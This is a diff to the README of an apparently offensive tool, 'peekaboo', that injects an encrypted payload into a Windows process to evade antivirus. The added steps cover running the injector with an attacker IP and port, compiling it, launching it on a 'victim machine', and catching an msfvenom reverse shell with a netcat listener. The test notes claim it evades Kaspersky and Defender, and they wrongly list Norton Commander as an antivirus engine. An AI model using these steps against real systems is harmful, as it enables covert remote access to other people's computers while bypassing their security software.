@@ -42,27 +42,47 @@ example:
 
 ## 2.Injector
 ### on attacker machine:
-run python script on linux:
+check attacker ip:
 ```bash
-python3 peekaboo-inj.py -l 10.10.14.3 -p 4444
+ip a
 ```
+
+![check IP](./screenshots/6.png?raw=true)
+
+run python script on linux (for example process notepad.exe):
+```bash
+python3 peekaboo-inj.py -l 10.9.1.6 -p 4444 -e notepad.exe
+```
+
+![encrypting](./screenshots/7.png?raw=true)
 
 compile in VS - windows machine x64:
 ```cmd
 .\compile-inj.bat
 ```
 
+![compile in attacker windows x64](./screenshots/8.png?raw=true)
+
 ### then on victim machine (windows x64):
-```
+```cmd
 .\peekaboo.exe
 ```
+
+or click
+
+![run on victim machine](./screenshots/9.png?raw=true)
+
+### check on attacker machine:
+check your netcat listener:
+
+![check netcat listener](./screenshots/10.png?raw=true)
 
 ## Issues.
 Tested on:
 1. Attacker machines: Kali linux 2020.1, Windows 10 x64
-2. Victim machine: Windows 10 x64
-3. Payload: Calc.exe
-4. AV Engines: Kaspersky, Windows Defender
+2. Victim machine: Windows 7 x64, Windows 10 x64
+3. Payload: windows x64 reverse shell from msfvenom
+4. AV Engines: Kaspersky, Windows Defender, Norton Commander
 
 ## TODO
 Compile injector in Kali linux
